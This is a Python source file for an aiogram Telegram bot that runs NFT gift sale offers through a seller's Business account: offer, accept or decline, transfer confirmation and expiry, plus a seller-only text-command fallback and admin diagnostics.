"""
NFT Deal Bot — тонкая aiogram-оболочка над core.

Чистая логика (парсинг, SQLite, state machine, тексты) — в core.py.
Этот файл содержит только:
* инициализацию Bot/Dispatcher,
* хендлеры aiogram, которые вызывают core.decide_* и отвечают пользователю,
* фоновую задачу истечения офферов,
* main().

Запуск:
    BOT_TOKEN=... python bot.py
"""

import asyncio
import logging
import os

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    BusinessConnection,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

import core as C

# ── Конфиг ────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError(
        "BOT_TOKEN не задан. Установите переменную окружения BOT_TOKEN "
        "(в Render: Settings → Environment)."
    )

DB_PATH = os.environ.get("DB_PATH", "deals.db")
GC_PERIOD = int(os.environ.get("GC_PERIOD_SECONDS", "300"))
# ADMIN_ID — опционально; получит ответ на /diag и stdout-пинг при ошибках
_ADMIN_RAW = os.environ.get("ADMIN_ID", "").strip()
ADMIN_ID: int | None = int(_ADMIN_RAW) if _ADMIN_RAW.isdigit() else None

logging.basicConfig(
    level=os.environ.get("LOG_LEVEL", "INFO").upper(),
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
log = logging.getLogger("nftdeal")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()


# ── Клавиатуры ───────────────────────────────────────────────────────────
def kb_offer(order_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text="Принять", callback_data=f"accept:{order_id}"),
    ]])


def kb_instruction(order_id, buyer_username, buyer_user_id) -> InlineKeyboardMarkup:
    if buyer_username:
        send_url = f"tg://resolve?domain={buyer_username}"
    elif buyer_user_id:
        send_url = f"tg://user?id={buyer_user_id}"
    else:
        send_url = "tg://settings"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть чат получателя ↗", url=send_url)],
        [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm:{order_id}")],
    ])


# ── Классификация TelegramBadRequest ────────────────────────────────────
def _classify_tg_error(e: Exception) -> str:
    """Возвращает человекочитаемое сообщение для alert по тексту ошибки.

    Telegram API возвращает очень разные ошибки для бизнес-сообщений;
    без разбора пользователь видит «Ошибка Telegram API» и не понимает
    что делать. Распарсим типичные.
    """
    msg = str(e).upper()
    if "MESSAGE_NOT_MODIFIED" in msg:
        return ""  # игнор, не ошибка
    if "MESSAGE_TO_EDIT_NOT_FOUND" in msg or "MESSAGE TO EDIT NOT FOUND" in msg:
        return ("Сообщение с кнопкой удалено или устарело. "
                "Попросите покупателя создать новое предложение.")
    if "BUSINESS_CONNECTION_NOT_FOUND" in msg or "BUSINESS_CONNECTION_INVALID" in msg:
        return ("Бот отключён от Business-аккаунта. "
                "Переподключите его в Telegram → Настройки → Telegram "
                "для бизнеса → Чат-боты.")
    if "BOT_WAS_BLOCKED" in msg or "USER_IS_BLOCKED" in msg:
        return "Покупатель заблокировал бота или вас."
    if "CHAT_NOT_FOUND" in msg:
        return "Чат не найден — он мог быть удалён."
    if "MESSAGE_AUTHOR_REQUIRED" in msg:
        return ("Нет прав на редактирование сообщения. "
                "В настройках бота для бизнес-аккаунта должно быть разрешено "
                "«Отвечать на сообщения» и бот должен быть автором сообщения.")
    if "FORBIDDEN" in msg or "NOT ENOUGH RIGHTS" in msg:
        return ("Недостаточно прав у бота в этом Business-аккаунте. "
                "Проверьте разрешения в настройках бота для бизнеса.")
    return "Ошибка Telegram API, попробуйте ещё раз через минуту."


# ── Business connection ──────────────────────────────────────────────────
@dp.business_connection()
async def handle_business_connection(bc: BusinessConnection):
    C.biz_set(bc.id, bc.user.id, bc.user.username, bool(bc.is_enabled))
    # Логируем права, которые юзер дал боту — полезно для диагностики.
    rights = getattr(bc, "rights", None)
    log.info("biz_conn %s id=%s user_id=%s username=@%s rights=%s",
             "ON" if bc.is_enabled else "OFF", bc.id, bc.user.id, bc.user.username,
             rights)


# ── Business message ─────────────────────────────────────────────────────
def _extract_gift_ref(message: Message):
    for attr in ("unique_gift", "gift"):
        obj = getattr(message, attr, None)
        if obj is None:
            continue
        g = getattr(obj, "gift", obj)
        name = getattr(g, "name", None) or getattr(g, "title", None)
        num = getattr(g, "number", None)
        if name and num is not None:
            return name.replace(" ", ""), str(num)
    ref = C.extract_gift_ref_from_text(message.text or message.caption or "")
    if ref:
        return ref
    for ent_list in (message.entities or [], message.caption_entities or []):
        for ent in ent_list:
            url = getattr(ent, "url", None) or ""
            r = C.extract_gift_ref_from_text(url)
            if r:
                return r
    return None


async def _ensure_biz_owner(bcid: str) -> dict | None:
    info = C.biz_get(bcid)
    if info and info["enabled"]:
        return info
    try:
        bc = await bot.get_business_connection(bcid)
    except Exception as e:
        log.error("get_business_connection bcid=%s: %s", bcid, e)
        return None
    C.biz_set(bcid, bc.user.id, bc.user.username, bool(bc.is_enabled))
    log.info("biz_owner recovered via API id=%s user_id=%s", bcid, bc.user.id)
    return C.biz_get(bcid)


# ── Текстовый fallback для кнопок ───────────────────────────────────────
# Если по какой-то причине callback_query от кнопок не доходит до бота
# (24h-окно Business, ошибка Telegram, кэш клиента), продавец может
# прислать в свой business-чат команду `.accept TG-XXXXXXXXXX` и
# бот выполнит то же самое что сделала бы кнопка. Этот fallback всегда
# ВКЛ и является официальным альтернативным способом управления.
_TEXT_CMD_RE = __import__("re").compile(
    r"^\s*\.(accept|decline|confirm)\s+(TG-[A-Z0-9]{10})\s*$",
    __import__("re").IGNORECASE,
)


async def _execute_text_command(action: str, order_id: str,
                                 caller_id: int, bcid: str) -> str:
    """Исполняет текстовую команду. Возвращает человекочитаемый итог."""
    action = action.lower()
    if action == "accept":
        act, meta = C.decide_accept(order_id, caller_id)
    elif action == "decline":
        act, meta = C.decide_decline(order_id, caller_id)
    elif action == "confirm":
        act, meta = C.decide_confirm(order_id, caller_id)
    else:
        return f"Неизвестная команда: {action}"
    log.info("text_cmd %s order=%s from=%s action=%s",
             action, order_id, caller_id, act)
    if act == "session_lost":
        return "Этот ордер не найден."
    if act in ("already_instruction", "already_final"):
        return "Эта сделка уже обработана."
    if act == "not_owner":
        return "Это действие доступно только продавцу."
    if act == "wrong_state":
        return "Нельзя отклонить уже принятое."
    if act == "not_accepted_yet":
        return "Сначала примите предложение."
    if act == "cas_lost":
        return "Состояние изменилось, попробуйте снова."
    if act != "edit":
        return f"Неожиданное состояние: {act}"
    # action == "edit": делаем edit
    try:
        if action == "accept":
            await bot.edit_message_text(
                chat_id=meta["chat_id"], message_id=meta["msg_id"],
                text=C.build_instruction(
                    meta["amount"], meta["currency"],
                    meta["gift_name"], meta["gift_num"], order_id,
                    meta.get("buyer_username"), meta.get("buyer_user_id"),
                    meta["nft_url"],
                ),
                reply_markup=kb_instruction(
                    order_id, meta.get("buyer_username"), meta.get("buyer_user_id"),
                ),
                business_connection_id=meta["bcid"],
                link_preview_options=LinkPreviewOptions(
                    is_disabled=False, prefer_large_media=True, show_above_text=True,
                ),
            )
            return "✓ Принято."
        if action == "decline":
            await bot.edit_message_text(
                chat_id=meta["chat_id"], message_id=meta["msg_id"],
                text=C.DECLINED_TEXT, reply_markup=None,
                business_connection_id=meta["bcid"],
                link_preview_options=LinkPreviewOptions(is_disabled=True),
            )
            return "✓ Отклонено."
        # confirm
        await bot.edit_message_text(
            chat_id=meta["chat_id"], message_id=meta["msg_id"],
            text=C.build_accepted(meta["amount"], meta["currency"], order_id),
            reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        return "✓ Подтверждено."
    except TelegramBadRequest as e:
        # Откат state
        rollback_map = {
            "accept": (C.STATE_INSTRUCTION, C.STATE_OFFER),
            "decline": (C.STATE_DECLINED, C.STATE_OFFER),
            "confirm": (C.STATE_CONFIRMED, C.STATE_INSTRUCTION),
        }
        frm, to = rollback_map[action]
        C.pending_cas_state(order_id, frm, to)
        hint = _classify_tg_error(e) or "edit прошёл."
        log.error("text_cmd %s edit order=%s: %s", action, order_id, e)
        return f"✗ {hint}"


@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    text = message.text or ""
    log.info("business_message chat=%s from=%s bcid=%s text=%r",
             message.chat.id, message.from_user.id if message.from_user else None,
             bcid, text[:80])

    # 1) Текстовая команда управления от продавца (fallback вместо кнопок)
    m = _TEXT_CMD_RE.match(text)
    if m:
        action, order_id = m.group(1), m.group(2).upper()
        caller_id = message.from_user.id if message.from_user else 0
        # Защита: команда должна прийти ОТ владельца BC
        if not C.is_order_seller(order_id, caller_id):
            # Проверим fallback через biz_owners
            await _ensure_biz_owner(bcid)
            if not C.is_bc_owner(bcid, caller_id):
                log.warning("text_cmd rejected: caller=%s not seller for order=%s",
                            caller_id, order_id)
                try:
                    await bot.send_message(
                        chat_id=message.chat.id,
                        text="⚠️ Эта команда доступна только продавцу.",
                        business_connection_id=bcid,
                    )
                except Exception:
                    pass
                return
        result = await _execute_text_command(action, order_id, caller_id, bcid)
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=result,
                business_connection_id=bcid,
            )
        except Exception as e:
            log.error("text_cmd reply failed: %s", e)
        return

    # 2) Soft-детектор передачи подарка
    ref = _extract_gift_ref(message)
    if ref:
        slug, num = ref
        pending = C.pending_find_by_gift(bcid, slug, num)
        if pending and pending["state"] == C.STATE_INSTRUCTION:
            C.pending_mark_transferred(pending["order_id"])
            log.info("gift_transferred (soft) order=%s", pending["order_id"])

    # 3) Новый оффер
    parsed = C.parse_command(text)
    if not parsed:
        return
    link, amount, currency = parsed
    gift = C.parse_gift(link)
    if not gift:
        return
    gift_name, gift_num, slug = gift

    seller_info = await _ensure_biz_owner(bcid)
    if not seller_info:
        return
    seller_user_id = seller_info["user_id"]
    seller_username = seller_info["username"]

    buyer = message.from_user
    buyer_user_id = buyer.id if buyer else None
    buyer_username = buyer.username if buyer else None

    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = C.oid()

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=C.build_offer_plain(amount, currency, gift_name, gift_num),
            reply_markup=kb_offer(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except (TelegramBadRequest, TelegramForbiddenError) as e:
        log.error("send_message bcid=%s: %s", bcid, e)
        return

    C.pending_insert({
        "order_id": order_id,
        "chat_id": message.chat.id,
        "msg_id": sent.message_id,
        "bcid": bcid,
        "amount": amount, "currency": currency,
        "gift_name": gift_name, "gift_num": gift_num, "gift_slug": slug,
        "nft_url": nft_url,
        "seller_user_id": seller_user_id,
        "seller_username": seller_username,
        "buyer_user_id": buyer_user_id,
        "buyer_username": buyer_username,
    })
    log.info("offer_created order=%s seller=%s buyer=%s gift=%s-%s amount=%s",
             order_id, seller_user_id, buyer_user_id, slug, gift_num, amount)

    await asyncio.sleep(1.0)
    try:
        await bot.edit_message_text(
            chat_id=message.chat.id, message_id=sent.message_id,
            text=C.build_offer_linked(amount, currency, gift_name, gift_num, nft_url),
            reply_markup=kb_offer(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False, prefer_large_media=True, show_above_text=True,
            ),
        )
    except TelegramBadRequest as e:
        log.warning("edit_preview order=%s: %s", order_id, e)


@dp.edited_business_message()
async def handle_edited_business(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    ref = _extract_gift_ref(message)
    if not ref:
        return
    slug, num = ref
    pending = C.pending_find_by_gift(bcid, slug, num)
    if pending and pending["state"] == C.STATE_INSTRUCTION:
        C.pending_mark_transferred(pending["order_id"])


# ── Callback handlers ───────────────────────────────────────────────────
async def _safe_answer(cb: CallbackQuery, text: str = "", show_alert: bool = False):
    try:
        await cb.answer(text, show_alert=show_alert)
    except Exception as e:
        log.warning("cb.answer failed id=%s: %s", cb.id, e)


def _cb_bcid(cb: CallbackQuery) -> str | None:
    """Пытаемся получить bcid из callback_query — для диагностики."""
    bcid = getattr(cb, "business_connection_id", None)
    if bcid:
        return bcid
    msg = getattr(cb, "message", None)
    if msg is not None:
        return getattr(msg, "business_connection_id", None)
    return None


@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(cb: CallbackQuery):
    data = cb.data or ""
    order_id = data.split(":", 1)[1] if ":" in data else ""
    log.info("cb decline order=%s from=%s cb_bcid=%s",
             order_id, cb.from_user.id, _cb_bcid(cb))
    try:
        action, meta = C.decide_decline(order_id, cb.from_user.id)
        log.info("decide_decline order=%s action=%s", order_id, action)
        if action == "session_lost":
            return await _safe_answer(cb, C.ERR_SESSION_LOST, show_alert=True)
        if action == "already_final":
            return await _safe_answer(cb, "Предложение уже закрыто.")
        if action == "not_owner":
            return await _safe_answer(cb, C.ERR_NOT_OWNER, show_alert=True)
        if action == "wrong_state":
            return await _safe_answer(cb, "Нельзя отклонить уже принятое.", show_alert=True)
        if action == "cas_lost":
            return await _safe_answer(cb, "Состояние изменилось.")
        try:
            await bot.edit_message_text(
                chat_id=meta["chat_id"], message_id=meta["msg_id"],
                text=C.DECLINED_TEXT, reply_markup=None,
                business_connection_id=meta["bcid"],
                link_preview_options=LinkPreviewOptions(is_disabled=True),
            )
        except TelegramBadRequest as e:
            C.pending_cas_state(order_id, C.STATE_DECLINED, C.STATE_OFFER)
            hint = _classify_tg_error(e)
            log.error("decline_edit order=%s: %s", order_id, e)
            return await _safe_answer(cb, hint or C.ERR_API, show_alert=True)
        await _safe_answer(cb, "Отклонено.")
    except Exception:
        log.exception("on_decline crashed order=%s", order_id)
        await _safe_answer(cb, C.ERR_API, show_alert=True)


@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(cb: CallbackQuery):
    data = cb.data or ""
    order_id = data.split(":", 1)[1] if ":" in data else ""
    log.info("cb accept order=%s from=%s cb_bcid=%s",
             order_id, cb.from_user.id, _cb_bcid(cb))
    try:
        meta_preview = C.pending_get(order_id)
        if meta_preview:
            await _ensure_biz_owner(meta_preview["bcid"])

        action, meta = C.decide_accept(order_id, cb.from_user.id)
        log.info("decide_accept order=%s action=%s", order_id, action)
        if action == "session_lost":
            return await _safe_answer(cb, C.ERR_SESSION_LOST, show_alert=True)
        if action == "already_instruction":
            return await _safe_answer(cb, "Предложение уже принято.")
        if action == "already_final":
            return await _safe_answer(cb, "Предложение уже закрыто.")
        if action == "not_owner":
            log.warning("not_owner order=%s from=%s seller_in_db=%s",
                        order_id, cb.from_user.id,
                        meta.get("seller_user_id") if meta else None)
            return await _safe_answer(cb, C.ERR_NOT_OWNER, show_alert=True)
        if action == "cas_lost":
            return await _safe_answer(cb, "Состояние изменилось, обновите чат.")
        try:
            await bot.edit_message_text(
                chat_id=meta["chat_id"], message_id=meta["msg_id"],
                text=C.build_instruction(
                    meta["amount"], meta["currency"],
                    meta["gift_name"], meta["gift_num"], order_id,
                    meta.get("buyer_username"), meta.get("buyer_user_id"),
                    meta["nft_url"],
                ),
                reply_markup=kb_instruction(
                    order_id,
                    meta.get("buyer_username"),
                    meta.get("buyer_user_id"),
                ),
                business_connection_id=meta["bcid"],
                link_preview_options=LinkPreviewOptions(
                    is_disabled=False, prefer_large_media=True, show_above_text=True,
                ),
            )
        except TelegramBadRequest as e:
            C.pending_cas_state(order_id, C.STATE_INSTRUCTION, C.STATE_OFFER)
            hint = _classify_tg_error(e)
            log.error("accept_edit order=%s: %s", order_id, e)
            return await _safe_answer(cb, hint or C.ERR_API, show_alert=True)
        await _safe_answer(cb, "Принято.")
    except Exception:
        log.exception("on_accept crashed order=%s", order_id)
        await _safe_answer(cb, C.ERR_API, show_alert=True)


@dp.callback_query(F.data.startswith("confirm:"))
async def on_confirm(cb: CallbackQuery):
    data = cb.data or ""
    order_id = data.split(":", 1)[1] if ":" in data else ""
    log.info("cb confirm order=%s from=%s cb_bcid=%s",
             order_id, cb.from_user.id, _cb_bcid(cb))
    try:
        action, meta = C.decide_confirm(order_id, cb.from_user.id)
        log.info("decide_confirm order=%s action=%s", order_id, action)
        if action == "session_lost":
            return await _safe_answer(cb, C.ERR_SESSION_LOST, show_alert=True)
        if action == "already_final":
            return await _safe_answer(cb, "Предложение уже закрыто.")
        if action == "not_accepted_yet":
            return await _safe_answer(cb, "Сначала примите предложение.", show_alert=True)
        if action == "not_owner":
            return await _safe_answer(cb, C.ERR_NOT_OWNER, show_alert=True)
        if action == "cas_lost":
            return await _safe_answer(cb, "Состояние изменилось, обновите чат.")
        try:
            await bot.edit_message_text(
                chat_id=meta["chat_id"], message_id=meta["msg_id"],
                text=C.build_accepted(meta["amount"], meta["currency"], order_id),
                reply_markup=None,
                business_connection_id=meta["bcid"],
                link_preview_options=LinkPreviewOptions(is_disabled=True),
            )
        except TelegramBadRequest as e:
            C.pending_cas_state(order_id, C.STATE_CONFIRMED, C.STATE_INSTRUCTION)
            hint = _classify_tg_error(e)
            log.error("confirm_edit order=%s: %s", order_id, e)
            return await _safe_answer(cb, hint or C.ERR_API, show_alert=True)
        await _safe_answer(cb, "Подтверждено.")
    except Exception:
        log.exception("on_confirm crashed order=%s", order_id)
        await _safe_answer(cb, C.ERR_API, show_alert=True)


@dp.callback_query()
async def on_unknown_callback(cb: CallbackQuery):
    log.warning("callback not matched: data=%r from=%s cb_bcid=%s",
                cb.data, cb.from_user.id, _cb_bcid(cb))
    await _safe_answer(cb, "Неизвестная команда — обновите чат.", show_alert=True)


# ── /start и /diag ──────────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(C.START_TEXT)


@dp.message(Command("diag"))
async def cmd_diag(message: Message):
    """Диагностика для админа — показывает состояние БД в Telegram.

    Доступно только тому user_id, который задан в env ADMIN_ID.
    """
    if ADMIN_ID is None or (message.from_user and message.from_user.id != ADMIN_ID):
        return  # молча игнорируем
    try:
        bcids = C._conn().execute(
            "SELECT bcid, user_id, enabled FROM biz_owners LIMIT 20"
        ).fetchall()
        pend = C._conn().execute(
            """SELECT order_id, bcid, state, seller_user_id, buyer_user_id,
                      gift_slug, gift_num, amount, currency,
                      datetime(created_ts,'unixepoch') AS created
               FROM pending ORDER BY created_ts DESC LIMIT 10"""
        ).fetchall()
        lines = [
            "<b>Diag</b>",
            f"DB_PATH: <code>{DB_PATH}</code>",
            f"TTL_HOURS: {C.TTL_HOURS}",
            "",
            f"<b>biz_owners</b> ({len(bcids)}):",
        ]
        for r in bcids:
            lines.append(
                f"  bcid=<code>{r['bcid']}</code> user={r['user_id']} enabled={r['enabled']}"
            )
        lines.append("")
        lines.append(f"<b>pending</b> (last {len(pend)}):")
        for r in pend:
            lines.append(
                f"  <code>{r['order_id']}</code> {r['state']} "
                f"seller={r['seller_user_id']} buyer={r['buyer_user_id']} "
                f"gift={r['gift_slug']}-{r['gift_num']} "
                f"{r['amount']} {r['currency']} ({r['created']})"
            )
        await message.answer("\n".join(lines) or "пусто")
    except Exception as e:
        log.exception("diag failed")
        await message.answer(f"diag error: {e}")


# ── Фоновая задача истечения ─────────────────────────────────────────────
async def expire_loop():
    ttl = C.TTL_HOURS * 3600
    while True:
        try:
            for meta in C.pending_expired(ttl):
                if not C.pending_cas_state(meta["order_id"], C.STATE_OFFER, C.STATE_EXPIRED):
                    continue
                try:
                    await bot.edit_message_text(
                        chat_id=meta["chat_id"], message_id=meta["msg_id"],
                        text=C.EXPIRED_TEXT, reply_markup=None,
                        business_connection_id=meta["bcid"],
                        link_preview_options=LinkPreviewOptions(is_disabled=True),
                    )
                except (TelegramBadRequest, TelegramForbiddenError) as e:
                    log.warning("expire_edit order=%s: %s", meta["order_id"], e)
            C.pending_gc_finalized()
        except Exception:
            log.exception("expire_loop iteration failed")
        await asyncio.sleep(GC_PERIOD)


async def recover_biz_owners_from_pending():
    bcids = C.pending_distinct_bcids()
    if not bcids:
        return
    log.info("recovering biz_owners for %d bcid(s) from active pending", len(bcids))
    for bcid in bcids:
        try:
            bc = await bot.get_business_connection(bcid)
            C.biz_set(bcid, bc.user.id, bc.user.username, bool(bc.is_enabled))
            log.info("  recovered bcid=%s user_id=%s enabled=%s",
                     bcid, bc.user.id, bc.is_enabled)
        except Exception as e:
            log.warning("  could not recover bcid=%s: %s", bcid, e)


# ── main ─────────────────────────────────────────────────────────────────
async def main():
    log.info("starting; DB_PATH=%s TTL_HOURS=%s ADMIN_ID=%s",
             DB_PATH, C.TTL_HOURS, ADMIN_ID)
    C.db_init(DB_PATH)
    try:
        me = await bot.get_me()
        log.info("bot: @%s id=%s", me.username, me.id)
    except Exception as e:
        log.error("get_me failed: %s", e)
    await recover_biz_owners_from_pending()

    expire_task = asyncio.create_task(expire_loop())
    try:
        await dp.start_polling(
            bot,
            allowed_updates=[
                "business_connection",
                "business_message",
                "edited_business_message",
                "callback_query",
                "message",
            ],
        )
    finally:
        expire_task.cancel()


if __name__ == "__main__":
    asyncio.run(main())
